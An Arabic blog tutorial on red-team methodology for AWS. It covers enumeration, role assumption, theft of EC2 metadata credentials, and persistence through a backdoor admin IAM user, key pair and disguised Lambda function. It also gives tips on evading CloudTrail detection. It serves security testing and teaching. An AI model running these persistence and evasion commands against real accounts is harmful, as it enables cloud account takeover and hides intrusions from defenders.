---
layout: blog
title: "منهجية Cloud Red Team على بيئة AWS: تقنيات الاختراق والدفاع في البنية السحابية"
date: 2026-04-05T15:15:16Z
category: "منهجية"
excerpt: "بيئة AWS تمثل تحديًا فريدًا لفرق Red Team. الهجمات التقليدية لا تكفي عندما تواجه Identity and Access Management وإعدادات S3 المعقدة. هذا الدليل يستعرض منهجية عملية لاختبار أمان البنية السحابية على AWS، من Enumeration حتى Privilege Escalation والـ Persistence."
read_time: 8
tags: ["Cloud Security", "AWS", "Red Team", "Penetration Testing", "IAM"]
slug: "aws-red-team"
image: "/OffsecAR/assets/images/blogs/aws-red-team.svg"
---

# منهجية Cloud Red Team على بيئة AWS

## فهم Attack Surface في AWS

البنية السحابية تختلف جذريًا عن البنية التقليدية. هنا، الهدف ليس خوادم فحسب، بل IAM Policies وS3 Buckets وLambda Functions. يبدأ الهجوم من فهم طبقات الأمان: Management Plane وData Plane وControl Plane.

أول خطوة هي تحديد نقاط الدخول المحتملة. قد تكون Access Keys مكشوفة في GitHub، أو Instance Metadata Service غير محمي، أو حتى Misconfigured Security Groups. كل نقطة تمثل منفذًا لسلسلة هجمات أعمق.

الفارق الأساسي: في AWS، الهوية هي المحيط الجديد. لا توجد جدران نارية تقليدية بقدر ما توجد Policies وRoles تتحكم بكل شيء.

## مرحلة Enumeration والاستطلاع

بعد الحصول على Credentials أولية، تبدأ مرحلة جمع المعلومات. استخدم AWS CLI للتعداد المنهجي:

```bash
# التحقق من الصلاحيات الحالية
aws sts get-caller-identity

# تعداد IAM Policies المرتبطة
aws iam list-attached-user-policies --user-name target-user
aws iam get-policy-version --policy-arn <arn> --version-id v1

# استكشاف الموارد المتاحة
aws ec2 describe-instances --region us-east-1
aws s3 ls
aws lambda list-functions
aws rds describe-db-instances
```

أدوات مثل ScoutSuite وProwler تساعد في الأتمتة، لكن الفهم اليدوي ضروري. ابحث عن:
- S3 Buckets بصلاحيات Public
- IAM Users بـ Overprivileged Policies
- EC2 Instances بـ IMDSv1 مفعّل
- Lambda Functions بـ Environment Variables حساسة

الهدف: رسم خريطة كاملة للبيئة السحابية قبل التحرك للمرحلة التالية.

## تقنيات Privilege Escalation السحابية

AWS يوفر مسارات فريدة لـ Privilege Escalation. إليك السيناريوهات الأكثر شيوعًا:

**سيناريو 1: IAM Role Assumption**

إذا وجدت صلاحية `sts:AssumeRole`، يمكنك انتحال أدوار أخرى:

```bash
# افترض دورًا بصلاحيات أعلى
aws sts assume-role \
  --role-arn arn:aws:iam::123456789012:role/AdminRole \
  --role-session-name RedTeamSession

# استخدم الـ Credentials الجديدة
export AWS_ACCESS_KEY_ID=<new-key>
export AWS_SECRET_ACCESS_KEY=<new-secret>
export AWS_SESSION_TOKEN=<token>
```

**سيناريو 2: Lambda Privilege Escalation**

إذا كان لديك `lambda:UpdateFunctionCode`، يمكنك تعديل Function بصلاحيات أعلى:

```python
import boto3
import json

def lambda_handler(event, context):
    # استخراج Credentials من Lambda Role
    iam = boto3.client('iam')
    # تنفيذ أوامر بصلاحيات الـ Function
    return {
        'statusCode': 200,
        'body': json.dumps('Privilege Escalated')
    }
```

**سيناريو 3: EC2 Instance Profile Abuse**

استغلال IMDS للحصول على Credentials:

```bash
# من داخل EC2 Instance
TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`

curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

## Persistence في البيئة السحابية

بعد الوصول، تحتاج لضمان الاستمرارية. AWS يوفر طرقًا متعددة:

```bash
# إنشاء IAM User خلفي
aws iam create-user --user-name backup-user
aws iam create-access-key --user-name backup-user
aws iam attach-user-policy --user-name backup-user \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# إضافة SSH Key لـ EC2 Instances
aws ec2 create-key-pair --key-name backdoor-key

# إنشاء Lambda Backdoor
aws lambda create-function \
  --function-name monitoring-service \
  --runtime python3.9 \
  --role arn:aws:iam::account:role/lambda-exec \
  --handler index.handler \
  --zip-file fileb://backdoor.zip
```

أفضل تقنية: إخفاء Backdoor في CloudWatch Events أو EventBridge Rules. تبدو كـ Automation عادية لكنها تنفذ أكوادًا خبيثة.

## Detection Evasion وأفضل الممارسات

AWS CloudTrail يسجل كل شيء. للتهرب من الكشف:

- استخدم Regions غير مراقبة (`us-gov` أو `ap-south-1`)
- وزّع الهجمات زمنيًا (rate limiting)
- استخدم VPC Endpoints لتجنب Internet Gateway Logs
- استغل Assumed Roles لإخفاء الهوية الأصلية

```bash
# فحص إعدادات CloudTrail
aws cloudtrail describe-trails
aws cloudtrail get-trail-status --name <trail-name>

# البحث عن Regions بدون Logging
for region in $(aws ec2 describe-regions --query 'Regions[].RegionName' --output text); do
  echo "Checking $region"
  aws cloudtrail describe-trails --region $region
done
```

كـ Red Team، هدفك ليس فقط الاختراق، بل اختبار قدرة Blue Team على الكشف والاستجابة. سجّل كل خطوة، واكتب تقريرًا مفصلاً بالثغرات والتوصيات.

المنهجية الناجحة تجمع بين المعرفة التقنية العميقة بـ AWS، وفهم Business Logic للتطبيقات السحابية، والقدرة على التفكير كمهاجم حقيقي. كل بيئة فريدة، والإبداع في الاستغلال هو ما يميز Red Teamer محترف عن Script Kiddie.
